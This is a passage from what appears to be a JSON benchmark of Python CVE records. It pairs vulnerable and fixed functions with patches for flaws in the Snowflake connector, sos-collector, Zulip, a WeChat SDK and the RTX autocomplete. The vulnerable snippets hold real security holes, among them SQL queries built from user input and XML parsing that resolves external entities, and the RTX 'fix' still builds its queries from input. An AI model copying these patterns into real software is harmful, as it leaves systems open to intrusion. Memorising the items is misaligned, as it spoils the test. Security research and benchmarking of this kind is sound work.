Load block using LMS APIs and check if the block is graded and still accept grades.\n-            block = compat.load_block_as_user(instance.line_item.resource_link_id)\n+            block = compat.load_block_as_user(line_item.resource_link_id)\n             if block.has_score and (not block.is_past_due() or block.accept_grades_past_due):\n                 # Map external ID to platform user\n                 user = compat.get_user_from_external_user_id(instance.user_id)\n@@ -42,7 +60,7 @@\n             log.exception(\n                 \"Error while publishing score %r to block %s to LMS: %s\",\n                 instance,\n-                instance.line_item.resource_link_id,\n+                line_item.resource_link_id,\n                 exc,\n             )\n             raise exc\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-34233",
    "cve_description": "The Snowflake Connector for Python provides an interface for developing Python applications that can connect to Snowflake and perform all standard operations. Versions prior to 3.0.2 are vulnerable to command injection via single sign-on(SSO) browser URL authentication. In order to exploit the potential for command injection, an attacker would need to be successful in (1) establishing a malicious resource and (2) redirecting users to utilize the resource. The attacker could set up a malicious, publicly accessible server which responds to the SSO URL with an attack payload. If the attacker then tricked a user into visiting the maliciously crafted connection URL, the user\u2019s local machine would render the malicious payload, leading to a remote code execution. This attack scenario can be mitigated through URL whitelisting as well as common anti-phishing resources. Version 3.0.2 contains a patch for this issue.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/snowflakedb/snowflake-connector-python",
    "patch_url": [
      "https://github.com/snowflakedb/snowflake-connector-python/commit/1cdbd3b1403c5ef520d7f4d9614fe35165e101ac"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_14_1",
        "commit": "4b1d474",
        "file_path": "src/snowflake/connector/snow_logging.py",
        "start_line": 59,
        "end_line": 72,
        "snippet": "    def warn(  # type: ignore[override]\n        self,\n        msg: str,\n        path_name: str | None = None,\n        func_name: str | None = None,\n        *args: Any,\n        **kwargs: Any,\n    ) -> None:\n        warnings.warn(\n            \"The 'warn' method is deprecated, \" \"use 'warning' instead\",\n            DeprecationWarning,\n            2,\n        )\n        self.warning(msg, path_name, func_name, *args, **kwargs)"
      },
      {
        "id": "vul_py_14_2",
        "commit": "4b1d474",
        "file_path": "src/snowflake/connector/auth/webbrowser.py",
        "start_line": 100,
        "end_line": 174,
        "snippet": "    def prepare(\n        self,\n        *,\n        conn: SnowflakeConnection,\n        authenticator: str,\n        service_name: str | None,\n        account: str,\n        user: str,\n        **kwargs: Any,\n    ) -> None:\n        \"\"\"Web Browser based Authentication.\"\"\"\n        logger.debug(\"authenticating by Web Browser\")\n\n        socket_connection = self._socket(socket.AF_INET, socket.SOCK_STREAM)\n        try:\n            try:\n                socket_connection.bind(\n                    (\n                        os.getenv(\"SF_AUTH_SOCKET_ADDR\", \"localhost\"),\n                        int(os.getenv(\"SF_AUTH_SOCKET_PORT\", 0)),\n                    )\n                )\n            except socket.gaierror as ex:\n                if ex.args[0] == socket.EAI_NONAME:\n                    raise OperationalError(\n                        msg=\"localhost is not found. Ensure /etc/hosts has \"\n                        \"localhost entry.\",\n                        errno=ER_NO_HOSTNAME_FOUND,\n                    )\n                else:\n                    raise ex\n            socket_connection.listen(0)  # no backlog\n            callback_port = socket_connection.getsockname()[1]\n\n            print(\n                \"Initiating login request with your identity provider. A \"\n                \"browser window should have opened for you to complete the \"\n                \"login. If you can't see it, check existing browser windows, \"\n                \"or your OS settings. Press CTRL+C to abort and try again...\"\n            )\n\n            logger.debug(\"step 1: query GS to obtain SSO url\")\n            sso_url = self._get_sso_url(\n                conn, authenticator, service_name, account, callback_port, user\n            )\n\n            logger.debug(\"step 2: open a browser\")\n            print(f\"Going to open: {sso_url} to authenticate...\")\n            if not self._webbrowser.open_new(sso_url):\n                print(\n                    \"We were unable to open a browser window for you, \"\n                    \"please open the url above manually then paste the \"\n                    \"URL you are redirected to into the terminal.\"\n                )\n                url = input(\"Enter the URL the SSO URL redirected you to: \")\n                self._process_get_url(url)\n                if not self._token:\n                    # Input contained no token, either URL was incorrectly pasted,\n                    # empty or just wrong\n                    self._handle_failure(\n                        conn=conn,\n                        ret={\n                            \"code\": ER_UNABLE_TO_OPEN_BROWSER,\n                            \"message\": (\n                                \"Unable to open a browser in this environment and \"\n                                \"SSO URL contained no token\"\n                            ),\n                        },\n                    )\n                    return\n            else:\n                logger.debug(\"step 3: accept SAML token\")\n                self._receive_saml_token(conn, socket_connection)\n        finally:\n            socket_connection.close()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_14_1",
        "commit": "1cdbd3b",
        "file_path": "src/snowflake/connector/snow_logging.py",
        "start_line": 59,
        "end_line": 72,
        "snippet": "    def warn(  # type: ignore[override]\n        self,\n        msg: str,\n        path_name: str | None = None,\n        func_name: str | None = None,\n        *args: Any,\n        **kwargs: Any,\n    ) -> None:\n        warnings.warn(\n            \"The 'warn' method is deprecated, \" \"use 'warning' instead\",\n            DeprecationWarning,\n            stacklevel=2,\n        )\n        self.warning(msg, path_name, func_name, *args, **kwargs)"
      },
      {
        "id": "fix_py_14_2",
        "commit": "1cdbd3b",
        "file_path": "src/snowflake/connector/auth/webbrowser.py",
        "start_line": 102,
        "end_line": 187,
        "snippet": "    def prepare(\n        self,\n        *,\n        conn: SnowflakeConnection,\n        authenticator: str,\n        service_name: str | None,\n        account: str,\n        user: str,\n        **kwargs: Any,\n    ) -> None:\n        \"\"\"Web Browser based Authentication.\"\"\"\n        logger.debug(\"authenticating by Web Browser\")\n\n        socket_connection = self._socket(socket.AF_INET, socket.SOCK_STREAM)\n        try:\n            try:\n                socket_connection.bind(\n                    (\n                        os.getenv(\"SF_AUTH_SOCKET_ADDR\", \"localhost\"),\n                        int(os.getenv(\"SF_AUTH_SOCKET_PORT\", 0)),\n                    )\n                )\n            except socket.gaierror as ex:\n                if ex.args[0] == socket.EAI_NONAME:\n                    raise OperationalError(\n                        msg=\"localhost is not found. Ensure /etc/hosts has \"\n                        \"localhost entry.\",\n                        errno=ER_NO_HOSTNAME_FOUND,\n                    )\n                else:\n                    raise ex\n            socket_connection.listen(0)  # no backlog\n            callback_port = socket_connection.getsockname()[1]\n\n            logger.debug(\"step 1: query GS to obtain SSO url\")\n            sso_url = self._get_sso_url(\n                conn, authenticator, service_name, account, callback_port, user\n            )\n\n            logger.debug(\"Validate SSO URL\")\n            if not is_valid_url(sso_url):\n                self._handle_failure(\n                    conn=conn,\n                    ret={\n                        \"code\": ER_INVALID_VALUE,\n                        \"message\": (f\"The SSO URL provided {sso_url} is invalid\"),\n                    },\n                )\n                return\n\n            print(\n                \"Initiating login request with your identity provider. A \"\n                \"browser window should have opened for you to complete the \"\n                \"login. If you can't see it, check existing browser windows, \"\n                \"or your OS settings. Press CTRL+C to abort and try again...\"\n            )\n\n            logger.debug(\"step 2: open a browser\")\n            print(f\"Going to open: {sso_url} to authenticate...\")\n            if not self._webbrowser.open_new(sso_url):\n                print(\n                    \"We were unable to open a browser window for you, \"\n                    \"please open the url above manually then paste the \"\n                    \"URL you are redirected to into the terminal.\"\n                )\n                url = input(\"Enter the URL the SSO URL redirected you to: \")\n                self._process_get_url(url)\n                if not self._token:\n                    # Input contained no token, either URL was incorrectly pasted,\n                    # empty or just wrong\n                    self._handle_failure(\n                        conn=conn,\n                        ret={\n                            \"code\": ER_UNABLE_TO_OPEN_BROWSER,\n                            \"message\": (\n                                \"Unable to open a browser in this environment and \"\n                                \"SSO URL contained no token\"\n                            ),\n                        },\n                    )\n                    return\n            else:\n                logger.debug(\"step 3: accept SAML token\")\n                self._receive_saml_token(conn, socket_connection)\n        finally:\n            socket_connection.close()"
      }
    ],
    "vul_patch": "--- a/src/snowflake/connector/snow_logging.py\n+++ b/src/snowflake/connector/snow_logging.py\n@@ -9,6 +9,6 @@\n         warnings.warn(\n             \"The 'warn' method is deprecated, \" \"use 'warning' instead\",\n             DeprecationWarning,\n-            2,\n+            stacklevel=2,\n         )\n         self.warning(msg, path_name, func_name, *args, **kwargs)\n\n--- a/src/snowflake/connector/auth/webbrowser.py\n+++ b/src/snowflake/connector/auth/webbrowser.py\n@@ -32,16 +32,27 @@\n             socket_connection.listen(0)  # no backlog\n             callback_port = socket_connection.getsockname()[1]\n \n+            logger.debug(\"step 1: query GS to obtain SSO url\")\n+            sso_url = self._get_sso_url(\n+                conn, authenticator, service_name, account, callback_port, user\n+            )\n+\n+            logger.debug(\"Validate SSO URL\")\n+            if not is_valid_url(sso_url):\n+                self._handle_failure(\n+                    conn=conn,\n+                    ret={\n+                        \"code\": ER_INVALID_VALUE,\n+                        \"message\": (f\"The SSO URL provided {sso_url} is invalid\"),\n+                    },\n+                )\n+                return\n+\n             print(\n                 \"Initiating login request with your identity provider. A \"\n                 \"browser window should have opened for you to complete the \"\n                 \"login. If you can't see it, check existing browser windows, \"\n                 \"or your OS settings. Press CTRL+C to abort and try again...\"\n-            )\n-\n-            logger.debug(\"step 1: query GS to obtain SSO url\")\n-            sso_url = self._get_sso_url(\n-                conn, authenticator, service_name, account, callback_port, user\n             )\n \n             logger.debug(\"step 2: open a browser\")\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-34233:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/snowflake-connector-python\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-34233/bin/python -m pytest test/unit/test_url_util.py test/unit/test_auth_webbrowser.py -v -k \"test_auth_webbrowser_invalid_sso\" && /workspace/PoC_env/CVE-2023-34233/bin/python hand_test.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2023-34233:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/snowflake-connector-python\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2023-34233/bin/python -m pytest test/unit/test_auth_webbrowser.py -v \n"
  },
  {
    "cve_id": "CVE-2018-14650",
    "cve_description": "It was discovered that sos-collector does not properly set the default permissions of newly created files, making all files created by the tool readable by any local user. A local attacker may use this flaw by waiting for a legit user to run sos-collector and steal the collected data in the /var/tmp directory.",
    "cwe_info": {
      "CWE-732": {
        "name": "Incorrect Permission Assignment for Critical Resource",
        "description": "The product specifies permissions for a security-critical resource in a way that allows that resource to be read or modified by unintended actors."
      }
    },
    "repo": "https://github.com/sosreport/sos-collector",
    "patch_url": [
      "https://github.com/sosreport/sos-collector/commit/72058f9253e7ed8c7243e2ff76a16d97b03d65ed"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_120_1",
        "commit": "a89ab38",
        "file_path": "soscollector/sos_collector.py",
        "start_line": 43,
        "end_line": 64,
        "snippet": "    def __init__(self, config):\n        self.config = config\n        self.threads = []\n        self.workers = []\n        self.client_list = []\n        self.node_list = []\n        self.master = False\n        self.retrieved = 0\n        self.need_local_sudo = False\n        if not self.config['list_options']:\n            try:\n                if not self.config['tmp_dir']:\n                    self.create_tmp_dir()\n                self._setup_logging()\n                self.log_debug('Executing %s' % ' '.join(s for s in sys.argv))\n                self._load_clusters()\n                self._parse_options()\n                self.prep()\n            except KeyboardInterrupt:\n                self._exit('Exiting on user cancel', 130)\n        else:\n            self._load_clusters()"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_120_1",
        "commit": "72058f9253e7ed8c7243e2ff76a16d97b03d65ed",
        "file_path": "soscollector/sos_collector.py",
        "start_line": 43,
        "end_line": 65,
        "snippet": "    def __init__(self, config):\n        os.umask(0077)\n        self.config = config\n        self.threads = []\n        self.workers = []\n        self.client_list = []\n        self.node_list = []\n        self.master = False\n        self.retrieved = 0\n        self.need_local_sudo = False\n        if not self.config['list_options']:\n            try:\n                if not self.config['tmp_dir']:\n                    self.create_tmp_dir()\n                self._setup_logging()\n                self.log_debug('Executing %s' % ' '.join(s for s in sys.argv))\n                self._load_clusters()\n                self._parse_options()\n                self.prep()\n            except KeyboardInterrupt:\n                self._exit('Exiting on user cancel', 130)\n        else:\n            self._load_clusters()"
      }
    ],
    "vul_patch": "--- a/soscollector/sos_collector.py\n+++ b/soscollector/sos_collector.py\n@@ -1,4 +1,5 @@\n     def __init__(self, config):\n+        os.umask(0077)\n         self.config = config\n         self.threads = []\n         self.workers = []\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-32677",
    "cve_description": "Zulip is an open-source team collaboration tool with unique topic-based threading. Zulip administrators can configure Zulip to limit who can add users to streams, and separately to limit who can invite users to the organization. In Zulip Server 6.1 and below, the UI which allows a user to invite a new user also allows them to set the streams that the new user is invited to -- even if the inviting user would not have permissions to add an existing user to streams. While such a configuration is likely rare in practice, the behavior does violate security-related controls. This does not let a user invite new users to streams they cannot see, or would not be able to add users to if they had that general permission. This issue has been addressed in version 6.2. Users are advised to upgrade. Users unable to upgrade may limit sending of invitations down to users who also have the permission to add users to streams.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/7c2693a2c64904d1d0af8503b57763943648cbe5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_200_1",
        "commit": "3df1b4d",
        "file_path": "zerver/views/invite.py",
        "start_line": 42,
        "end_line": 93,
        "snippet": "def invite_users_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    invitee_emails_raw: str = REQ(\"invitee_emails\"),\n    invite_expires_in_minutes: Optional[int] = REQ(\n        json_validator=check_none_or(check_int), default=INVITATION_LINK_VALIDITY_MINUTES\n    ),\n    invite_as: int = REQ(\n        json_validator=check_int_in(\n            list(PreregistrationUser.INVITE_AS.values()),\n        ),\n        default=PreregistrationUser.INVITE_AS[\"MEMBER\"],\n    ),\n    stream_ids: List[int] = REQ(json_validator=check_list(check_int)),\n) -> HttpResponse:\n    if not user_profile.can_invite_others_to_realm():\n        # Guest users case will not be handled here as it will\n        # be handled by the decorator above.\n        raise JsonableError(_(\"Insufficient permission\"))\n    check_if_owner_required(invite_as, user_profile)\n    if (\n        invite_as\n        in [\n            PreregistrationUser.INVITE_AS[\"REALM_ADMIN\"],\n            PreregistrationUser.INVITE_AS[\"MODERATOR\"],\n        ]\n        and not user_profile.is_realm_admin\n    ):\n        raise JsonableError(_(\"Must be an organization administrator\"))\n    if not invitee_emails_raw:\n        raise JsonableError(_(\"You must specify at least one email address.\"))\n\n    invitee_emails = get_invitee_emails_set(invitee_emails_raw)\n\n    streams: List[Stream] = []\n    for stream_id in stream_ids:\n        try:\n            (stream, sub) = access_stream_by_id(user_profile, stream_id)\n        except JsonableError:\n            raise JsonableError(\n                _(\"Stream does not exist with id: {}. No invites were sent.\").format(stream_id)\n            )\n        streams.append(stream)\n\n    do_invite_users(\n        user_profile,\n        invitee_emails,\n        streams,\n        invite_expires_in_minutes=invite_expires_in_minutes,\n        invite_as=invite_as,\n    )\n    return json_success(request)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_200_1",
        "commit": "7c2693a",
        "file_path": "zerver/views/invite.py",
        "start_line": 42,
        "end_line": 96,
        "snippet": "def invite_users_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    invitee_emails_raw: str = REQ(\"invitee_emails\"),\n    invite_expires_in_minutes: Optional[int] = REQ(\n        json_validator=check_none_or(check_int), default=INVITATION_LINK_VALIDITY_MINUTES\n    ),\n    invite_as: int = REQ(\n        json_validator=check_int_in(\n            list(PreregistrationUser.INVITE_AS.values()),\n        ),\n        default=PreregistrationUser.INVITE_AS[\"MEMBER\"],\n    ),\n    stream_ids: List[int] = REQ(json_validator=check_list(check_int)),\n) -> HttpResponse:\n    if not user_profile.can_invite_others_to_realm():\n        # Guest users case will not be handled here as it will\n        # be handled by the decorator above.\n        raise JsonableError(_(\"Insufficient permission\"))\n    check_if_owner_required(invite_as, user_profile)\n    if (\n        invite_as\n        in [\n            PreregistrationUser.INVITE_AS[\"REALM_ADMIN\"],\n            PreregistrationUser.INVITE_AS[\"MODERATOR\"],\n        ]\n        and not user_profile.is_realm_admin\n    ):\n        raise JsonableError(_(\"Must be an organization administrator\"))\n    if not invitee_emails_raw:\n        raise JsonableError(_(\"You must specify at least one email address.\"))\n\n    invitee_emails = get_invitee_emails_set(invitee_emails_raw)\n\n    streams: List[Stream] = []\n    for stream_id in stream_ids:\n        try:\n            (stream, sub) = access_stream_by_id(user_profile, stream_id)\n        except JsonableError:\n            raise JsonableError(\n                _(\"Stream does not exist with id: {}. No invites were sent.\").format(stream_id)\n            )\n        streams.append(stream)\n\n    if len(streams) and not user_profile.can_subscribe_other_users():\n        raise JsonableError(_(\"You do not have permission to subscribe other users to streams.\"))\n\n    do_invite_users(\n        user_profile,\n        invitee_emails,\n        streams,\n        invite_expires_in_minutes=invite_expires_in_minutes,\n        invite_as=invite_as,\n    )\n    return json_success(request)"
      }
    ],
    "vul_patch": "--- a/zerver/views/invite.py\n+++ b/zerver/views/invite.py\n@@ -42,6 +42,9 @@\n             )\n         streams.append(stream)\n \n+    if len(streams) and not user_profile.can_subscribe_other_users():\n+        raise JsonableError(_(\"You do not have permission to subscribe other users to streams.\"))\n+\n     do_invite_users(\n         user_profile,\n         invitee_emails,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-25082",
    "cve_description": "A vulnerability was found in zwczou WeChat SDK Python 0.3.0 and classified as critical. This issue affects the function validate/to_xml. The manipulation leads to xml external entity reference. The attack may be initiated remotely. Upgrading to version 0.5.5 is able to address this issue. The patch is named e54abadc777715b6dcb545c13214d1dea63df6c9. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-223403.",
    "cwe_info": {
      "CWE-611": {
        "name": "Improper Restriction of XML External Entity Reference",
        "description": "The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
      }
    },
    "repo": "https://github.com/zwczou/weixin-python",
    "patch_url": [
      "https://github.com/zwczou/weixin-python/commit/e54abadc777715b6dcb545c13214d1dea63df6c9"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_403_1",
        "commit": "2539f1ab6fbae79cb9a741c47e317d658d37a080",
        "file_path": "weixin/msg.py",
        "start_line": 65,
        "end_line": 80,
        "snippet": "    def parse(self, content):\n        raw = {}\n        root = etree.fromstring(content)\n        for child in root:\n            raw[child.tag] = child.text\n\n        formatted = self.format(raw)\n        msg_type = formatted['type']\n        msg_parser = getattr(self, 'parse_{0}'.format(msg_type), None)\n        if callable(msg_parser):\n            parsed = msg_parser(raw)\n        else:\n            parsed = self.parse_invalid_type(raw)\n\n        formatted.update(parsed)\n        return formatted"
      },
      {
        "id": "vul_py_403_2",
        "commit": "2539f1ab6fbae79cb9a741c47e317d658d37a080",
        "file_path": "weixin/pay.py",
        "start_line": 80,
        "end_line": 85,
        "snippet": "    def to_dict(self, content):\n        raw = {}\n        root = etree.fromstring(content.encode(\"utf-8\"))\n        for child in root:\n            raw[child.tag] = child.text\n        return raw"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_403_1",
        "commit": "e54abadc777715b6dcb545c13214d1dea63df6c9",
        "file_path": "weixin/msg.py",
        "start_line": 65,
        "end_line": 81,
        "snippet": "    def parse(self, content):\n        raw = {}\n        root = etree.fromstring(content,\n                                parser=etree.XMLParser(resolve_entities=False))\n        for child in root:\n            raw[child.tag] = child.text\n\n        formatted = self.format(raw)\n        msg_type = formatted['type']\n        msg_parser = getattr(self, 'parse_{0}'.format(msg_type), None)\n        if callable(msg_parser):\n            parsed = msg_parser(raw)\n        else:\n            parsed = self.parse_invalid_type(raw)\n\n        formatted.update(parsed)\n        return formatted"
      },
      {
        "id": "fix_py_403_2",
        "commit": "e54abadc777715b6dcb545c13214d1dea63df6c9",
        "file_path": "weixin/pay.py",
        "start_line": 80,
        "end_line": 86,
        "snippet": "    def to_dict(self, content):\n        raw = {}\n        root = etree.fromstring(content.encode(\"utf-8\"),\n                                parser=etree.XMLParser(resolve_entities=False))\n        for child in root:\n            raw[child.tag] = child.text\n        return raw"
      }
    ],
    "vul_patch": "--- a/weixin/msg.py\n+++ b/weixin/msg.py\n@@ -1,6 +1,7 @@\n     def parse(self, content):\n         raw = {}\n-        root = etree.fromstring(content)\n+        root = etree.fromstring(content,\n+                                parser=etree.XMLParser(resolve_entities=False))\n         for child in root:\n             raw[child.tag] = child.text\n \n\n--- a/weixin/pay.py\n+++ b/weixin/pay.py\n@@ -1,6 +1,7 @@\n     def to_dict(self, content):\n         raw = {}\n-        root = etree.fromstring(content.encode(\"utf-8\"))\n+        root = etree.fromstring(content.encode(\"utf-8\"),\n+                                parser=etree.XMLParser(resolve_entities=False))\n         for child in root:\n             raw[child.tag] = child.text\n         return raw\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-1531",
    "cve_description": "SQL injection vulnerability in ARAX-UI Synonym Lookup functionality in GitHub repository rtxteam/rtx prior to checkpoint_2022-04-20 . This vulnerability is critical as it can lead to remote code execution and thus complete server takeover.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/rtxteam/rtx",
    "patch_url": [
      "https://github.com/rtxteam/rtx/commit/fa2797e656e3dba18f990a2db1f0f029d41f1921"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_150_1",
        "commit": "12b9fa7",
        "file_path": "code/autocomplete/rtxcomplete.py",
        "start_line": 29,
        "end_line": 135,
        "snippet": "def get_nodes_like(word,requested_limit):\n\n    debug = False\n\n    t0 = timeit.default_timer()\n    requested_limit = int(requested_limit)\n\n    values = []\n    n_values = 0\n\n    if len(word) < 2:\n        return values\n\n    floor = word[:-1]\n    ceiling = floor + 'zz'\n\n    #### Get a list of matching node names that begin with these letters\n    if debug:\n        print(f\"INFO: Query 1\")\n    #cursor.execute(\"SELECT term FROM term WHERE term LIKE \\\"%s%%\\\" ORDER BY length(term),term LIMIT %s\" % (word,1000))\n    cursor.execute(f\"SELECT term FROM terms WHERE term > \\\"{floor}\\\" AND term < \\\"{ceiling}\\\" AND term LIKE \\\"{word}%%\\\" ORDER BY length(term),term LIMIT {requested_limit}\")\n    rows = cursor.fetchall()\n    values_dict = {}\n    for row in rows:\n        term = row[0]\n        if term.upper() not in values_dict:\n            if debug:\n                print(f\"    - {term}\")\n            properties = { \"curie\": '??', \"name\": term, \"type\": '??' }\n            values.append(properties)\n            values_dict[term.upper()] = 1\n            n_values += 1\n            if n_values >= requested_limit:\n                break\n    t1 = timeit.default_timer()\n    if debug:\n        print(f\"INFO: Query 1 in {t1-t0} sec\")\n\n    #### If we haven't reached the limit yet, add a list of matching terms that contain this string\n    if n_values < requested_limit:\n        if debug:\n            print(f\"INFO: Query 2\")\n\n        #### See if there is a cached entry already\n        word_part = word\n        found_fragment = None\n        while len(word_part) > 2:\n            cursor.execute(f\"SELECT rowid, fragment FROM cached_fragments WHERE fragment == \\\"{word_part}\\\"\")\n            rows = cursor.fetchall()\n            if len(rows) > 0:\n                fragment_id = rows[0][0]\n                found_fragment = rows[0][1]\n                break\n            word_part = word_part[:-1]\n\n        if found_fragment:\n            if debug:\n                print(f\"Found matching fragment {found_fragment} as fragment_id {fragment_id}\")\n\n            cursor.execute(f\"SELECT term FROM cached_fragment_terms WHERE fragment_id = {fragment_id} AND term LIKE \\\"%%{word}%%\\\"\")\n            rows = cursor.fetchall()\n\n            for row in rows:\n                term = row[0]\n                if term.upper() not in values_dict:\n\n                    if n_values < requested_limit:\n                        if debug:\n                            print(f\"    - {term}\")\n                        properties = { \"curie\": '??', \"name\": term, \"type\": '??' }\n                        values.append(properties)\n                        n_values += 1\n\n\n        if found_fragment is None:\n\n            #### Cache this fragment in the database\n            cursor.execute(\"INSERT INTO cached_fragments(fragment) VALUES(?)\", (word,))\n            fragment_id = cursor.lastrowid\n            if debug:\n                print(f\"fragment_id = {fragment_id}\")\n\n            #### Execute an expensive LIKE query\n            cursor.execute(\"SELECT term FROM terms WHERE term LIKE \\\"%%%s%%\\\" ORDER BY length(term),term LIMIT %s\" % (word,10000))\n            rows = cursor.fetchall()\n\n            for row in rows:\n                term = row[0]\n                if term.upper() not in values_dict:\n\n                    if n_values < requested_limit:\n                        if debug:\n                            print(f\"    - {term}\")\n                        properties = { \"curie\": '??', \"name\": term, \"type\": '??' }\n                        values.append(properties)\n                        n_values += 1\n\n                    values_dict[term.upper()] = 1\n                    cursor.execute(\"INSERT INTO cached_fragment_terms(fragment_id, term) VALUES(?,?)\", (fragment_id, term,))\n            conn.commit()\n\n        t2 = timeit.default_timer()\n        if debug:\n            print(f\"INFO: Query 2 in {t2-t1} sec\")\n\n\n    return(values)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_150_1",
        "commit": "fa2797e",
        "file_path": "code/autocomplete/rtxcomplete.py",
        "start_line": 30,
        "end_line": 143,
        "snippet": "def get_nodes_like(word,requested_limit):\n\n    debug = False\n\n    t0 = timeit.default_timer()\n    requested_limit = int(requested_limit)\n\n    values = []\n    n_values = 0\n\n    if len(word) < 2:\n        return values\n\n    #### Try to avoid SQL injection exploits by sanitizing input #1823\n    word = word.replace('\"','')\n\n    floor = word[:-1]\n    ceiling = floor + 'zz'\n\n    #### Get a list of matching node names that begin with these letters\n    if debug:\n        print(f\"INFO: Query 1\")\n    #cursor.execute(\"SELECT term FROM term WHERE term LIKE \\\"%s%%\\\" ORDER BY length(term),term LIMIT %s\" % (word,1000))\n    cursor.execute(f\"SELECT term FROM terms WHERE term > \\\"{floor}\\\" AND term < \\\"{ceiling}\\\" AND term LIKE \\\"{word}%%\\\" ORDER BY length(term),term LIMIT {requested_limit}\")\n    rows = cursor.fetchall()\n    values_dict = {}\n    for row in rows:\n        term = row[0]\n        if term.upper() not in values_dict:\n            if debug:\n                print(f\"    - {term}\")\n            properties = { \"curie\": '??', \"name\": term, \"type\": '??' }\n            values.append(properties)\n            values_dict[term.upper()] = 1\n            n_values += 1\n            if n_values >= requested_limit:\n                break\n    t1 = timeit.default_timer()\n    if debug:\n        print(f\"INFO: Query 1 in {t1-t0} sec\")\n\n    #### If we haven't reached the limit yet, add a list of matching terms that contain this string\n    if n_values < requested_limit:\n        if debug:\n            print(f\"INFO: Query 2\")\n\n        #### See if there is a cached entry already\n        word_part = word\n        found_fragment = None\n        while len(word_part) > 2:\n            cursor.execute(f\"SELECT rowid, fragment FROM cached_fragments WHERE fragment == \\\"{word_part}\\\"\")\n            rows = cursor.fetchall()\n            if len(rows) > 0:\n                fragment_id = rows[0][0]\n                found_fragment = rows[0][1]\n                break\n            word_part = word_part[:-1]\n\n        if found_fragment:\n            if debug:\n                print(f\"Found matching fragment {found_fragment} as fragment_id {fragment_id}\")\n\n            cursor.execute(f\"SELECT term FROM cached_fragment_terms WHERE fragment_id = {fragment_id} AND term LIKE \\\"%%{word}%%\\\"\")\n            rows = cursor.fetchall()\n\n            for row in rows:\n                term = row[0]\n                if term.upper() not in values_dict:\n\n                    if n_values < requested_limit:\n                        if debug:\n                            print(f\"    - {term}\")\n                        properties = { \"curie\": '??', \"name\": term, \"type\": '??' }\n                        values.append(properties)\n                        n_values += 1\n\n\n        if found_fragment is None:\n\n            #### Cache this fragment in the database\n            try:\n                cursor.execute(\"INSERT INTO cached_fragments(fragment) VALUES(?)\", (word,))\n                fragment_id = cursor.lastrowid\n            except:\n                print(f\"ERROR: Unable to INSERT into cached_fragments(fragment)\",file=sys.stderr)\n                fragment_id = 0\n            if debug:\n                print(f\"fragment_id = {fragment_id}\")\n\n            #### Execute an expensive LIKE query\n            cursor.execute(\"SELECT term FROM terms WHERE term LIKE \\\"%%%s%%\\\" ORDER BY length(term),term LIMIT %s\" % (word,10000))\n            rows = cursor.fetchall()\n\n            for row in rows:\n                term = row[0]\n                if term.upper() not in values_dict:\n\n                    if n_values < requested_limit:\n                        if debug:\n                            print(f\"    - {term}\")\n                        properties = { \"curie\": '??', \"name\": term, \"type\": '??' }\n                        values.append(properties)\n                        n_values += 1\n\n                    values_dict[term.upper()] = 1\n                    cursor.execute(\"INSERT INTO cached_fragment_terms(fragment_id, term) VALUES(?,?)\", (fragment_id, term,))\n            conn.commit()\n\n        t2 = timeit.default_timer()\n        if debug:\n            print(f\"INFO: Query 2 in {t2-t1} sec\")\n\n\n    return(values)"
      }
    ],
